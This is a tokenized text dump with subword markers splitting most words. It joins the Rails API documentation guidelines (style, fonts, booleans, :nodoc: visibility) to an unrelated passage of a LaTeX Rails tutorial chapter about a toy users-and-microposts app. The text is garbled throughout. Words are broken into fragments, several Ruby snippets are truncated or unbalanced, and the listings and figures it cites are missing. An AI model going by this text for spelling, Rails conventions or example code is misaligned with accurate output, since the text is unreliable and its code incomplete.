▁Co m m un ic ate ▁to ▁the ▁reader ▁the ▁current ▁way ▁of ▁doing ▁things , ▁both ▁explicitly ▁and ▁ implicit ly .
▁Use ▁the ▁idiom s ▁recommended ▁in ▁edge .
▁Re order ▁section s ▁to ▁emphasize ▁favor ed ▁approach es ▁if ▁needed , ▁etc .
▁The ▁documentation ▁should ▁be ▁a ▁model ▁for ▁best ▁practice s ▁and ▁canonical , ▁mode r n ▁Rails ▁usage .
▁Documentation ▁has ▁to ▁be ▁con ci se ▁but ▁com pre h en s ive .
▁Exp lo re ▁and ▁document ▁edge ▁cases .
▁What ▁happens ▁if ▁a ▁module ▁is ▁ anonymous ?
▁What ▁if ▁a ▁collection ▁is ▁empty ?
▁What ▁if ▁an ▁argument ▁is ▁nil ?
▁The ▁proper ▁names ▁of ▁Rails ▁components ▁have ▁a ▁ space ▁in ▁between ▁the ▁words , ▁like ▁" Active ▁Support ".
▁` ActiveRecord ` ▁is ▁a ▁Ruby ▁module , ▁whereas ▁Active ▁Record ▁is ▁an ▁OR M .
▁All ▁Rails ▁documentation ▁should ▁consistent ly ▁refer ▁to ▁Rails ▁components ▁by ▁their ▁proper ▁name , ▁and ▁if ▁in ▁your ▁next ▁blog ▁post ▁or ▁present ation ▁you ▁remember ▁this ▁ti db it ▁and ▁take ▁it ▁into ▁account ▁that ' d ▁be ▁ ph en o me n al .
▁S p e ll ▁names ▁correctly : ▁A rel , ▁ Test :: U n it , ▁RSpec , ▁HTML , ▁MySQL , ▁JavaScript , ▁ERB .
▁When ▁in ▁do u b t , ▁please ▁have ▁a ▁look ▁at ▁some ▁author it a tive ▁source ▁like ▁their ▁of fi cial ▁documentation .
▁Use ▁the ▁article ▁" an " ▁for ▁" SQL ", ▁as ▁in ▁" an ▁SQL ▁statement ".
▁Also ▁" an ▁SQLite ▁database ".
▁P ref er ▁word ing s ▁that ▁avoid ▁" you " s ▁and ▁" your " s .
▁For ▁example , ▁instead ▁of
▁`` ` m ar k d own
▁If ▁you ▁need ▁to ▁use ▁` return ` ▁statement s ▁in ▁your ▁callbacks , ▁it ▁is ▁recommended ▁that ▁you ▁explicitly ▁define ▁them ▁as ▁methods .
▁use ▁this ▁style :
▁If ▁` return ` ▁is ▁needed ▁it ▁is ▁recommended ▁to ▁explicitly ▁define ▁a ▁method .
▁That ▁said , ▁when ▁using ▁ pronoun s ▁in ▁reference ▁to ▁a ▁h y p o the t ical ▁person , ▁such ▁as ▁" a < n > user ▁with ▁a ▁session ▁cookie ", ▁g end er ▁ n e u tr al ▁ pronoun s ▁( the y / the ir / the m ) ▁should ▁be < n > us ed .
▁Instead ▁of :
▁* ▁he ▁or ▁ s h e . . . ▁use ▁they .
▁* ▁h i m ▁or ▁h er . . . ▁use ▁them .
▁* ▁his ▁or ▁h er . . . ▁use ▁their .
▁* ▁his ▁or ▁h ers . . . ▁use ▁their s .
▁* ▁h i m self ▁or ▁h er self . . . ▁use ▁themselves .
▁English
▁P lease ▁use ▁A m er ic an ▁English ▁( * color * , ▁* center * , ▁* mod ul ar ize * , ▁etc ).
▁See ▁[ a ▁list ▁of ▁A m er ic an ▁and ▁B r it is h ▁English ▁sp e ll ing ▁difference s ▁here ]( http :// en . wiki p edia . org / wiki / A m er ic an _ and _ B r it is h _ E n g li s h _ s p e ll ing _ difference s ).
▁Example ▁Code
▁Choos e ▁meaning ful ▁examples ▁that ▁ de p ic t ▁and ▁cover ▁the ▁basic s ▁as ▁well ▁as ▁interest ing ▁point s ▁or ▁go t cha s .
▁Use ▁two ▁spaces ▁to ▁ indent ▁chunks ▁of ▁code - - that ▁is , ▁for ▁markup ▁purposes , ▁two ▁spaces ▁with ▁re spec t ▁to ▁the ▁left ▁m ar g in .
▁The ▁examples ▁themselves ▁should ▁use ▁[ Rails ▁ coding ▁convention s ]( co n tr i but ing _ to _ ruby _ on _ rails . html # follow - the - coding - co n v ent ion s ).
▁S h or t ▁ doc s ▁do ▁not ▁need ▁an ▁explicit ▁" Ex ample s " ▁ label ▁to ▁introduce ▁ s n ip p et s ; ▁they ▁just ▁follow ▁ paragraph s :
▁# ▁Convert s ▁a ▁collection ▁of ▁elements ▁into ▁a ▁ formatted ▁string ▁by
▁# ▁calling ▁ + to _ s + ▁on ▁all ▁elements ▁and ▁join ing ▁them .
▁# ▁B log . all . to _ formatted _ s ▁# ▁=> ▁" First ▁ Post S ec on d ▁ Post T h ir d ▁ Post "
▁On ▁the ▁other ▁hand , ▁big ▁chunks ▁of ▁structure d ▁documentation ▁may ▁have ▁a ▁separate ▁" Ex ample s " ▁section :
▁# ▁== = = ▁Example s
▁# ▁Person . exists ?(
▁# ▁Person . exists ?( '
▁name : ▁" David ")
▁# ▁Person . exists ?( ['
▁name ▁L I K E ▁ ? ' , ▁" % # { query } % "] )
▁The ▁results ▁of ▁expression s ▁follow ▁them ▁and ▁are ▁introduce d ▁by ▁" # ▁=> ▁" , ▁vertical ly ▁a li g n ed :
▁# ▁1. even ?
▁# ▁1. o d d ?
▁# ▁2 . even ?
▁# ▁2 . o d d ?
▁If ▁a ▁line ▁is ▁too ▁long , ▁the ▁comment ▁may ▁be ▁placed ▁on ▁the ▁next ▁line :
▁# ▁ label (: article , ▁: title )
▁# ▁# ▁=> ▁< label ▁for =" article _ title "> T it le </ label >
▁# ▁ label (: article , ▁: title , ▁" A ▁short ▁title ")
▁# ▁# ▁=> ▁< label ▁for =" article _ title "> A ▁short ▁title </ label >
▁# ▁ label (: article , ▁: title , ▁" A ▁short ▁title ", ▁class : ▁" title _ label ")
▁# ▁# ▁=> ▁< label ▁for =" article _ title " ▁class =" title _ label "> A ▁short ▁title </ label >
▁A v o id ▁using ▁any ▁ print ing ▁methods ▁like ▁` put s ` ▁or ▁` p ` ▁for ▁that ▁purpose .
▁On ▁the ▁other ▁hand , ▁regular ▁comments ▁do ▁not ▁use ▁an ▁a r row :
▁# ▁ polymorphic _ url ( record ) ▁# ▁same ▁as ▁comment _ url ( record )
▁Bo o le an s
▁In ▁predicate s ▁and ▁flag s ▁prefer ▁document ing ▁boolean ▁ s em ant ic s ▁over ▁exact ▁values .
▁When ▁" true " ▁or ▁" false " ▁are ▁used ▁as ▁defined ▁in ▁Ruby ▁use ▁regular ▁font .
▁The < n > s ing leton s ▁` true ` ▁and ▁` false ` ▁need ▁ fixed - width ▁font .
▁P lease ▁avoid ▁terms ▁like < n > " t ru th y ", ▁Ruby ▁defines ▁what ▁is ▁true ▁and ▁false ▁in ▁the ▁language , ▁and ▁thus ▁those < n > words ▁have ▁a ▁technical ▁meaning ▁and ▁need ▁no ▁sub st it ute s .
▁As ▁a ▁rule ▁of ▁thumb , ▁do ▁not ▁document ▁single to n s ▁unless ▁ abs ol ute ly ▁necessary .
▁That < n > prev ent s ▁a r t if i cial ▁construct s ▁like ▁` ! !` ▁or ▁ ter n ar ies , ▁allows ▁refactor s , ▁and ▁the < n > code ▁does ▁not ▁need ▁to ▁rely ▁on ▁the ▁exact ▁values ▁returned ▁by ▁methods ▁being ▁called < n > in ▁the ▁implementation .
▁` config . action _ mailer . perform _ deliveries ` ▁specifie s ▁whether ▁mail ▁will ▁actually ▁be ▁ deliver ed ▁and ▁is ▁true ▁by ▁default
▁the ▁user ▁does ▁not ▁need ▁to ▁know ▁which ▁is ▁the ▁actual ▁default ▁value ▁of ▁the ▁flag ,< n > and ▁so ▁we ▁only ▁document ▁its ▁boolean ▁ s em ant ic s .
▁An ▁example ▁with ▁a ▁predicate :
▁# ▁Return s ▁true ▁if ▁the ▁collection ▁is ▁empty .
▁# ▁If ▁the ▁collection ▁has ▁been ▁loaded
▁# ▁it ▁is ▁equivalent ▁to ▁< tt > collection . size . zero ? </ tt > . ▁If ▁the
▁# ▁collection ▁has ▁not ▁been ▁loaded , ▁it ▁is ▁equivalent ▁to
▁# ▁< tt > collection . exists ? </ tt > . ▁If ▁the ▁collection ▁has ▁not ▁already ▁been
▁# ▁loaded ▁and ▁you ▁are ▁going ▁to ▁fetch ▁the ▁records ▁any way ▁it ▁is ▁better ▁to
▁# ▁check ▁< tt > collection . length . zero ? </ tt > .
▁def ▁empty ?
▁if ▁loaded ?
▁size . zero ?
▁@ target . blank ?
▁The ▁API ▁is ▁careful ▁not ▁to ▁commit ▁to ▁any ▁particular ▁value , ▁the ▁method ▁has < n > pre d ic ate ▁ s em ant ic s , ▁that ' s ▁enough .
▁File ▁Name s
▁As ▁a ▁rule ▁of ▁thumb , ▁use ▁filename s ▁relative ▁to ▁the ▁application ▁root :
▁config / routes . rb ▁# ▁ Y E S
▁routes . rb ▁# ▁N O
▁R AIL S _ R O O T / config / routes . rb ▁# ▁N O
▁F on t s
▁### ▁Fix ed - width ▁F on t
▁Use ▁ fixed - width ▁font s ▁for :
▁* ▁Co n st ant s , ▁in ▁particular ▁class ▁and ▁module ▁names .
▁* ▁ Method ▁names .
▁* ▁L it er al s ▁like ▁` nil `, ▁` false `, ▁` true `, ▁` self `.
▁* ▁ Symbol s .
▁* ▁ Method ▁parameters .
▁* ▁File ▁names .
▁class ▁ Array
▁# ▁Call s ▁ + to _ param + ▁on ▁all ▁its ▁elements ▁and ▁join s ▁the ▁result ▁with
▁# ▁ slash es .
▁This ▁is ▁used ▁by ▁ + url _ for + ▁in ▁Action ▁Pack .
▁collect ▁ { ▁| e | ▁e . to _ param ▁ }. join ▁' / '
▁WARNING : ▁Using ▁` + . . . + ` ▁for ▁ fixed - width ▁font ▁only ▁works ▁with ▁simple ▁content ▁like < n > or d in ary ▁method ▁names , ▁symbols , ▁paths ▁( with ▁forward ▁ slash es ), ▁etc .
▁P lease ▁use < n >` < tt > . . . </ tt >` ▁for ▁everything ▁else , ▁not ably ▁class ▁or ▁module ▁names ▁with ▁a < n > namespace ▁as ▁in ▁` < tt > ActiveRecord :: Base </ tt >` .
▁You ▁can ▁quickly ▁test ▁the ▁ RDoc ▁output ▁with ▁the ▁following ▁command :
▁ $ ▁e ch o ▁" + : to _ param + " ▁| ▁ rdoc ▁-- p ip e
▁# => ▁< p >< code > : to _ param </ code ></ p >
▁### ▁R egular ▁F on t
▁When ▁" true " ▁and ▁" false " ▁are ▁English ▁words ▁rather ▁than ▁Ruby ▁keyword s ▁use ▁a ▁regular ▁font :
▁# ▁Run s ▁all ▁the ▁validations ▁within ▁the ▁specified ▁context .
▁# ▁Return s ▁true ▁if ▁no ▁errors ▁are ▁found , ▁false ▁otherwise .
▁# ▁If ▁the ▁argument ▁is ▁false ▁( default ▁is ▁ + nil + ), ▁the ▁context ▁is
▁# ▁set ▁to ▁< tt > : create </ tt > ▁if ▁< tt > new _ record ?
▁</ tt > ▁is ▁true ,
▁# ▁and ▁to ▁< tt > : update </ tt > ▁if ▁it ▁is ▁not .
▁# ▁Validation s ▁with ▁no ▁< tt > : on </ tt > ▁option ▁will ▁run ▁no
▁# ▁matter ▁the ▁context .
▁Validation s ▁with ▁# ▁some ▁< tt > : on </ tt >
▁# ▁option ▁will ▁only ▁run ▁in ▁the ▁specified ▁context .
▁def ▁valid ?(
▁De script ion ▁L ist s
▁In ▁list s ▁of ▁options , ▁parameters , ▁etc . ▁use ▁a ▁h y ph en ▁between ▁the ▁item ▁and ▁its ▁description ▁( read s ▁better ▁than ▁a ▁co lo n ▁because ▁normally ▁options ▁are ▁symbols ) :
▁# ▁* ▁< tt > : allow _ nil </ tt > ▁- ▁S k ip ▁validation ▁if ▁attribute ▁is ▁ + nil + .
▁The ▁description ▁start s ▁in ▁upper ▁case ▁and ▁end s ▁with ▁a ▁full ▁stop - it ' s ▁standard ▁English .
▁D y n am ical ly ▁Generat ed ▁ Method s
▁ Method s ▁created ▁with ▁` ( module | class ) _ eval ( ST R ING )` ▁have ▁a ▁comment ▁by ▁their ▁side ▁with ▁an ▁instance ▁of ▁the ▁generated ▁code .
▁That ▁comment ▁is ▁2 ▁spaces ▁a way ▁from ▁the ▁template :
▁for ▁sever ity ▁in ▁S ever ity . constant s
▁class _ eval ▁< < - E O T , ▁ _ _ F I LE _ _ , ▁ _ _ L IN E _ _
▁def ▁# { s ever ity . downcase } ( message ▁= ▁nil , ▁ prog name ▁= ▁nil , ▁ & block ) ▁# ▁def ▁debug ( message ▁= ▁nil , ▁ prog name ▁= ▁nil , ▁ & block )
▁add ( # { s ever ity }, ▁message , ▁ prog name , ▁ & block ) ▁# ▁add ( D E B U G , ▁message , ▁ prog name , ▁ & block )
▁end ▁# ▁end
▁#
▁def ▁# { s ever ity . downcase } ?
▁# ▁def ▁debug ?
▁# { s ever ity } ▁ > = ▁@ level ▁# ▁D E B U G ▁ > = ▁@ level
▁E O T
▁If ▁the ▁result ing ▁lines ▁are ▁too ▁ wide , ▁say ▁200 ▁columns ▁or ▁more , ▁put ▁the ▁comment ▁above ▁the ▁call :
▁# ▁def ▁self . find _ by _ login _ and _ activated ( * args )
▁# ▁options ▁= ▁ args . extract _ options !
▁# ▁...
▁self . class _ eval ▁% {
▁def ▁self . # { method _ id } ( * args )
▁options ▁= ▁ args . extract _ options !
▁ Method ▁Vi s i b il ity
▁When ▁writing ▁documentation ▁for ▁Rails , ▁it ' s ▁important ▁to ▁understand ▁the ▁difference ▁between ▁public ▁user - f ac ing ▁API ▁ v s ▁internal ▁API .
▁Rails , ▁like ▁most ▁libraries , ▁uses ▁the ▁private ▁keyword ▁from ▁Ruby ▁for ▁defin ing ▁internal ▁API .
▁However , ▁public ▁API ▁follows ▁a ▁slightly ▁different ▁convention .
▁Instead ▁of ▁as sum ing ▁all ▁public ▁methods ▁are ▁design ed ▁for ▁user ▁con sum p t ion , ▁Rails ▁uses ▁the ▁`: no doc : ` ▁directive ▁to ▁ annotate ▁these ▁kind s ▁of ▁methods ▁as ▁internal ▁API .
▁This ▁means ▁that ▁there ▁are ▁methods ▁in ▁Rails ▁with ▁` public ` ▁ v is i b il ity ▁that ▁are n ' t ▁mean t ▁for ▁user ▁con sum p t ion .
▁An ▁example ▁of ▁this ▁is ▁` ActiveRecord :: Co re :: Class Method s # a rel _ table ` :
▁module ▁ActiveRecord :: Co re :: Class Method s
▁def ▁are l _ table ▁# : no doc :
▁# ▁do ▁some ▁magic . .
▁If ▁you ▁though t , ▁" this ▁method ▁look s ▁like ▁a ▁public ▁class ▁method ▁for ▁` ActiveRecord :: Co re ` ", ▁you ▁were ▁right .
▁But ▁actually ▁the ▁Rails ▁team ▁does n ' t ▁want ▁users ▁to ▁rely ▁on ▁this ▁method .
▁So ▁they ▁mark ▁it ▁as ▁`: no doc : ` ▁and ▁it ' s ▁removed ▁from ▁public ▁documentation .
▁The ▁reason ing ▁be h in d ▁this ▁is ▁to ▁allow ▁the ▁team ▁to ▁change ▁these ▁methods ▁according ▁to ▁their ▁internal ▁needs ▁across ▁release s ▁as ▁they ▁see ▁fit .
▁The ▁name ▁of ▁this ▁method ▁could ▁change , ▁or ▁the ▁return ▁value , ▁or ▁this ▁entire ▁class ▁may ▁disappear ; ▁there ' s ▁no ▁guarantee ▁and ▁so ▁you ▁should n ' t ▁depend ▁on ▁this ▁API ▁in ▁your ▁plugin s ▁or ▁applications .
▁Otherwise , ▁you ▁risk ▁your ▁app ▁or ▁gem ▁break ing ▁when ▁you ▁upgrade ▁to ▁a ▁new er ▁release ▁of ▁Rails .
▁As ▁a ▁ contributor , ▁it ' s ▁important ▁to ▁think ▁about ▁whether ▁this ▁API ▁is ▁mean t ▁for ▁end - user ▁con sum p t ion .
▁The ▁Rails ▁team ▁is ▁commit t ed ▁to ▁not ▁making ▁any ▁break ing ▁changes ▁to ▁public ▁API ▁across ▁release s ▁without ▁going ▁through ▁a ▁full ▁deprecation ▁cycle .
▁It ' s ▁recommended ▁that ▁you ▁`: no doc : ` ▁any ▁of ▁your ▁internal ▁methods / classes ▁unless ▁they ' re ▁already ▁private ▁( me an ing ▁ v is i b il ity ), ▁in ▁which ▁case ▁it ' s ▁internal ▁by ▁default .
▁On ce ▁the ▁API ▁sta b il ize s ▁the ▁ v is i b il ity ▁can ▁change , ▁but ▁changing ▁public ▁API ▁is ▁much ▁hard er ▁due ▁to ▁back w ar d s ▁ compatibility .
▁A ▁class ▁or ▁module ▁is ▁ marked ▁with ▁`: no doc : ` ▁to ▁indicate ▁that ▁all ▁methods ▁are ▁internal ▁API ▁and ▁should ▁ never ▁be ▁used ▁directly .
▁If ▁you ▁come ▁across ▁an ▁existing ▁`: no doc : ` ▁you ▁should ▁t read ▁light ly .
▁Consider ▁as k ing ▁some one ▁from ▁the ▁core ▁team ▁or ▁author ▁of ▁the ▁code ▁before ▁remov ing ▁it .
▁A ▁`: no doc : ` ▁should ▁ never ▁be ▁added ▁simply ▁because ▁a ▁method ▁or ▁class ▁is ▁missing ▁documentation .
▁There ▁may ▁be ▁an ▁instance ▁where ▁an ▁internal ▁public ▁method ▁was n ' t ▁given ▁a ▁`: no doc : ` ▁by ▁mistake , ▁for ▁example ▁when ▁switch ing ▁a ▁method ▁from ▁private ▁to ▁public ▁ v is i b il ity .
▁When ▁this ▁happens ▁it ▁should ▁be ▁discuss ed ▁over ▁a ▁P R ▁on ▁a ▁case - by - case ▁basis ▁and ▁ never ▁commit t ed ▁directly ▁to ▁ doc rails .
▁To ▁summariz e , ▁the ▁Rails ▁team ▁uses ▁`: no doc : ` ▁to ▁mark ▁public ly ▁visible ▁methods ▁and ▁classes ▁for ▁internal ▁use ; ▁changes ▁to ▁the ▁ v is i b il ity ▁of ▁API ▁should ▁be ▁consider ed ▁careful ly ▁and ▁discuss ed ▁over ▁a ▁pull ▁request ▁first .
▁Re g ar d ing ▁the ▁Rails ▁S t ac k
▁When ▁document ing ▁parts ▁of ▁Rails ▁API , ▁it ' s ▁important ▁to ▁remember ▁all ▁of ▁the < n > p i ec es ▁that ▁go ▁into ▁the ▁Rails ▁stack .
▁This ▁means ▁that ▁behavior ▁may ▁change ▁depending ▁on ▁the ▁scope ▁or ▁context ▁of ▁the < n > method ▁or ▁class ▁you ' re ▁try ing ▁to ▁document .
▁In ▁ various ▁place s ▁there ▁is ▁different ▁behavior ▁when ▁you ▁take ▁the ▁entire ▁stack < n > in to ▁account , ▁one ▁such ▁example ▁is < n >` ActionView :: Helpers :: Asset T a g Helper # image _ tag ` :
▁# ▁image _ tag (" ic on . png ")
▁# ▁# ▁=> ▁< img ▁ alt =" I co n " ▁src =" / assets / ic on . png " ▁/>
▁A lthough ▁the ▁default ▁behavior ▁for ▁` # image _ tag ` ▁is ▁to ▁always ▁return < n >` / images / ic on . png `, ▁we ▁take ▁into ▁account ▁the ▁full ▁Rails ▁stack ▁( including ▁the < n > Asset ▁Pipeline ) ▁we ▁may ▁see ▁the ▁result ▁seen ▁above .
▁We ' re ▁only ▁concern ed ▁with ▁the ▁behavior ▁experience d ▁when ▁using ▁the ▁full ▁default < n > Rails ▁stack .
▁In ▁this ▁case , ▁we ▁want ▁to ▁document ▁the ▁behavior ▁of ▁the ▁ _ framework _ , ▁and ▁not ▁just < n > this ▁specific ▁method .
▁If ▁you ▁have ▁a ▁question ▁on ▁how ▁the ▁Rails ▁team ▁handle s ▁certain ▁API , ▁don ' t ▁he s it ate ▁to ▁open ▁a ▁ tic k et ▁or ▁send ▁a ▁ patch ▁to ▁the ▁[ issue ▁track er ]( https :// github . com / rails / rails / issue s ).
▁The ▁functionality ▁will ▁be ▁ u tt er ly ▁under - developed , ▁and ▁many ▁of ▁the ▁steps ▁will ▁seem ▁like ▁magic , ▁but ▁worry ▁not : ▁the ▁full ▁sample ▁app ▁will ▁develop ▁a ▁similar ▁application ▁from ▁the ▁ ground ▁up ▁starting ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁and ▁I ▁will ▁provide ▁p l ent i ful ▁forward - reference s ▁to ▁later ▁material .
▁A ▁\ k ode { Gemfile } ▁for ▁the ▁toy ▁app .
▁Note ▁that ▁Listing ~\ ref { code : demo _ gemfile _ sqlite _ version _ redux } ▁is ▁identical ▁to ▁Listing ~\ ref { code : gemfile _ p g _ gem }.
▁Creat ing ▁the ▁toy ▁app ▁repository ▁at ▁Bitbucket .
▁The ▁data ▁model ▁for ▁users .
▁As ▁we ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : database _ migrations }, ▁the ▁ label ▁\ k ode { users } ▁in ▁F igure ~\ ref { fig : demo _ user _ model } ▁correspond s ▁to ▁a ▁\ emph { table } ▁in ▁a ▁database , ▁and ▁the ▁\ k ode { id }, ▁\ k ode { name }, ▁and ▁\ k ode { email } ▁attributes ▁are ▁\ emph { columns } ▁in ▁that ▁table .
▁There ' s ▁an ▁ additional ▁com plication , ▁though : ▁we ▁want ▁to ▁\ emph { associate } ▁each ▁micropost ▁with ▁a ▁particular ▁user . ▁We ' ll ▁accomplish ▁this ▁by ▁record ing ▁the ▁\ k ode { user \_ id } ▁of ▁the ▁own er ▁of ▁the ▁post .
▁The ▁data ▁model ▁for ▁microposts .
▁We ' ll ▁see ▁in ▁Section ~\ ref { sec : demo _ user _ has _ many _ microposts } ▁( and ▁more ▁fully ▁in ▁Chapter ~\ ref { cha : user _ microposts }) ▁how ▁this ▁\ k ode { user \_ id } ▁attribute ▁allows ▁us ▁to ▁succinct ly ▁express ▁the ▁not ion ▁that ▁a ▁user ▁ potentially ▁has ▁many ▁ associated ▁microposts .
▁By ▁including ▁\ k ode { name : string } ▁and ▁\ k ode { email : string }, ▁we ▁have ▁arrange d ▁for ▁the ▁User ▁model ▁to ▁have ▁the ▁form ▁show n ▁in ▁F igure ~\ ref { fig : demo _ user _ model }.
▁As ▁we ▁proceed , ▁it ▁may ▁help ▁to ▁refer ▁to ▁Table ~\ ref { table : user _ url s }, ▁which ▁shows ▁the ▁correspond ence ▁between ▁pages ▁and ▁URLs .
▁The ▁correspond ence ▁between ▁pages ▁and ▁URLs ▁for ▁the ▁Users ▁resource .
▁We ▁start ▁with ▁the ▁page ▁to ▁show ▁all ▁the ▁users ▁in ▁our ▁application , ▁called ▁\ href { http :// localhost :3000/ users }{\ text tt { index } } ; ▁as ▁you ▁m ight ▁expect , ▁initially ▁there ▁are ▁no ▁users ▁at ▁all ▁( F igure ~\ ref { fig : demo _ blank _ user _ index _ rails _3} ).
▁The ▁initial ▁index ▁page ▁for ▁the ▁Users ▁resource ▁(\ href { http :// localhost :3000/ users }{/ users }).
▁To ▁make ▁a ▁new ▁user , ▁we ▁visit ▁the ▁\ href { http :// localhost :3000/ users / new }{\ text tt { new } } ▁page , ▁as ▁show n ▁in ▁F igure ~\ ref { fig : demo _ new _ user _ rails _3} .
▁The ▁new ▁user ▁page ▁(\ href { http :// localhost :3000/ users / new }{/ users / new }).
▁The ▁result ▁is ▁the ▁user ▁\ href { http :// localhost :3000/ users /1 }{\ text tt { show } } ▁page , ▁as ▁seen ▁in ▁F igure ~\ ref { fig : demo _ show _ user _ rails _3} .
▁( The ▁green ▁ welcome ▁message ▁is ▁accomplish ed ▁using ▁the ▁\ emph { flash }, ▁which ▁we ' ll ▁learn ▁about ▁in ▁Section ~\ ref { sec : the _ flash }. )
▁Note ▁that ▁the ▁URL ▁is ▁\ href { http :// localhost :3000/ users /1}{ / users /1 } ; ▁as ▁you ▁m ight ▁suspect , ▁the ▁number ~\ k ode {1} ▁is ▁simply ▁the ▁user ' s ~\ k ode { id } ▁attribute ▁from ▁F igure ~\ ref { fig : demo _ user _ model }.
▁The ▁page ▁to ▁show ▁a ▁user ▁(\ href { http :// localhost :3000/ users /1}{ / users /1 }).
▁To ▁change ▁a ▁user ' s ▁information , ▁we ▁visit ▁the ▁\ href { http :// localhost :3000/ users /1/ edit }{\ text tt { edit } } ▁page ▁( F igure ~\ ref { fig : demo _ edit _ user _ rails _3} ).
▁By ▁modify ing ▁the ▁user ▁information ▁and ▁click ing ▁the ▁Update ▁User ▁button , ▁we ▁arrange ▁to ▁change ▁the ▁information ▁for ▁the ▁user ▁in ▁the ▁toy ▁application ▁( F igure ~\ ref { fig : demo _ update _ user _ rails _3} ).
▁( As ▁we ' ll ▁see ▁in ▁detail ▁starting ▁in ▁Chapter ~\ ref { cha : modeling _ users }, ▁this ▁user ▁data ▁is ▁store d ▁in ▁a ▁database ▁back - end .)
▁The ▁user ▁edit ▁page ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit }).
▁A ▁user ▁with ▁updated ▁information .
▁The ▁user ▁index ▁page ▁(\ href { http :// localhost :3000/ users }{/ users }) ▁with ▁a ▁second ▁user .
▁Having ▁show n ▁how ▁to ▁create , ▁show , ▁and ▁edit ▁users , ▁we ▁come ▁finally ▁to ▁destroying ▁them ▁( F igure ~\ ref { fig : demo _ destroy _ user }).
▁You ▁should ▁verify ▁that ▁click ing ▁on ▁the ▁link ▁in ▁F igure ~\ ref { fig : demo _ destroy _ user } ▁destroy s ▁the ▁second ▁user , ▁yield ing ▁an ▁index ▁page ▁with ▁only ▁one ▁user .
▁ Destroy ing ▁a ▁user .
▁Ou r ▁strategy ▁will ▁be ▁to ▁describe ▁the ▁results ▁of ▁a ▁typical ▁browser ▁hit --- a ▁visit ▁to ▁the ▁user ▁index ▁page ▁at ▁\ href { http :// localhost :3000/ users }{/ users }--- in ▁terms ▁of ▁MVC ▁( F igure ~\ ref { fig : mvc _ detailed }).
▁A ▁ detailed ▁diagram ▁of ▁MVC ▁in ▁Rails .
▁We ▁start ▁with ▁a ▁request ▁issue d ▁from ▁the ▁browser --- i . e . , ▁the ▁result ▁of ▁typing ▁a ▁URL ▁in ▁the ▁address ▁bar ▁or ▁click ing ▁on ▁a ▁link ▁( Step ~ 1 ▁in ▁F igure ~\ ref { fig : mvc _ detailed }).
▁The ▁code ▁to ▁create ▁the ▁mapping ▁of ▁user ▁URLs ▁to ▁controller ▁actions ▁for ▁the ▁Users ▁resource ▁appears ▁in ▁Listing ~\ ref { code : rails _ routes } ; ▁this ▁code ▁effective ly ▁set s ▁up ▁the ▁table ▁of ▁URL / action ▁pair s ▁seen ▁in ▁Table ~\ ref { table : user _ url s }.
▁The ▁Rails ▁routes , ▁with ▁a ▁rule ▁for ▁the ▁Users ▁resource .
▁ Adding ▁a ▁root ▁route ▁for ▁users .
▁The ▁Users ▁controller ▁in ▁schematic ▁form .
▁< n > ▁end
▁Note ▁from ▁Table ~\ ref { table : demo _ RESTful _ users } ▁that ▁there ▁is ▁some ▁ overlap ▁in ▁the ▁URLs ; ▁for ▁example , ▁both ▁the ▁user ▁\ k ode { show } ▁action ▁and ▁the ▁\ k ode { update } ▁action ▁correspond ▁to ▁the ▁URL ▁/ users /1 .
▁RESTful ▁routes ▁provided ▁by ▁the ▁Users ▁resource ▁in ▁Listing ~\ ref { code : rails _ routes }.
▁To ▁examine ▁the ▁relationship ▁between ▁the ▁Users ▁controller ▁and ▁the ▁User ▁model , ▁let ' s ▁focus ▁on ▁a ▁ simplified ▁version ▁of ▁the ▁\ k ode { index } ▁action , ▁show n ▁in ▁Listing ~\ ref { code : demo _ index _ action }.
▁The ▁ simplified ▁user ▁\ k ode { index } ▁action ▁for ▁the ▁toy ▁application .
▁This ▁\ k ode { index } ▁action ▁has ▁the ▁line ▁\ k ode {@ users ▁= ▁User . all } ▁( Step ~3 ▁in ▁F igure ~\ ref { fig : mvc _ detailed }), ▁which ▁as k s ▁the ▁User ▁model ▁to ▁retrieve ▁a ▁list ▁of ▁all ▁the ▁users ▁from ▁the ▁database ▁( Step ~ 4 ), ▁and ▁the n ▁place s ▁them ▁in ▁the ▁variable ▁\ k ode {@ users } ▁( pronoun c ed ▁`` at - users '') ▁( Step ~ 5 ).
▁The ▁User ▁model ▁itself ▁appears ▁in ▁Listing ~\ ref { code : demo _ user _ model } ; ▁although ▁it ▁is ▁rather ▁plain , ▁it ▁comes ▁equip ped ▁with ▁a ▁large ▁amount ▁of ▁functionality ▁because ▁of ▁inheritance ▁( Section ~\ ref { sec : inheritance _ hierarchies } ▁and ▁Section ~\ ref { sec : ruby _ classes }).
▁In ▁particular , ▁by ▁using ▁the ▁Rails ▁library ▁called ▁\ emph { Active ▁Record }, ▁the ▁code ▁in ▁Listing ~\ ref { code : demo _ user _ model } ▁arrange s ▁for ▁\ k ode { User . all } ▁to ▁return ▁all ▁the ▁users ▁in ▁the ▁database .
▁The ▁User ▁model ▁for ▁the ▁toy ▁application .
▁On ce ▁the ▁\ k ode {@ users } ▁variable ▁is ▁defined , ▁the ▁controller ▁calls ▁the ▁\ emph { view } ▁( Step ~ 6 ), ▁show n ▁in ▁Listing ~\ ref { code : demo _ index _ view }.
▁The ▁view ▁for ▁the ▁user ▁index .
▁As ▁with ▁the ▁Users ▁resource , ▁we ' ll ▁generate ▁scaffold ▁code ▁for ▁the ▁Microposts ▁resource ▁using ▁\ k ode { rails ▁generate ▁scaffold }, ▁in ▁this ▁case ▁implement ing ▁the ▁data ▁model ▁from ▁F igure ~\ ref { fig : demo _ micropost _ model }
▁as ▁seen ▁in ▁Listing ~\ ref { code : demo _ microposts _ resource }.
▁The ▁scaffold ▁code ▁may ▁have ▁extra ▁new line s ▁compare d ▁to ▁Listing ~\ ref { code : demo _ microposts _ resource }.
▁The ▁Rails ▁routes , ▁with ▁a ▁new ▁rule ▁for ▁Microposts ▁resources .
▁RESTful ▁routes ▁provided ▁by ▁the ▁Microposts ▁resource ▁in ▁Listing ~\ ref { code : demo _ microposts _ resource }.
▁The ▁Microposts ▁controller ▁itself ▁appears ▁in ▁schematic ▁form ▁Listing ~\ ref { code : demo _ microposts _ controller }.
▁The ▁Microposts ▁controller ▁in ▁schematic ▁form .
▁To ▁make ▁some ▁actual ▁microposts , ▁we ▁enter ▁information ▁at ▁the ▁new ▁microposts ▁page , ▁\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }, ▁as ▁seen ▁in ▁F igure ~\ ref { fig : demo _ new _ micropost }.
